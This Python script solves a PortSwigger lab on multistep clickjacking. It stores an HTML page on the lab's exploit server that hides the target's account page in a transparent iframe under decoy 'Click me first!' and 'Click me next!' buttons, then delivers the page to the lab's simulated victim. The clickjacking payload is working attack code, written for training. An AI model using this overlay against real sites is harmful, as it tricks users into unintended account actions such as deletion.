#!/usr/bin/env python3
# Multistep clickjacking
# Lab-Link: https://portswigger.net/web-security/clickjacking/lab-multistep
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host):
    # In difference to the previous lab the URLs need to use ' instead of " as the "  are used for the iframe.
    # as
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page1{
            position:absolute;
            top:515px;
            left:65px;
            z-index:1;
            }
        #evil_page2{
            position:absolute;
            top:310px;
            left:200px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page1">
    Click me first!
    </div>
    <div id="evil_page2">
    Click me next!
    </div>
    <iframe id="victim" src="''' + host + '''/my-account">
    </iframe>
</body>
''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def main():
    print('[+] Multistep clickjacking')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    if exploit_server is None:
        print(f'[-] Failed to find exploit server')
        sys.exit(-2)
    print(f'[+] Exploit server: {exploit_server}')

    if not store_exploit(client, exploit_server, host):
        print(f'[-] Failed to store exploit file')
        sys.exit(-3)
    print(f'[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print(f'[+] Delivered exploit to victim')

    # I had some times issues getting the proper result, so wait briefly before checking
    time.sleep(2)
    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
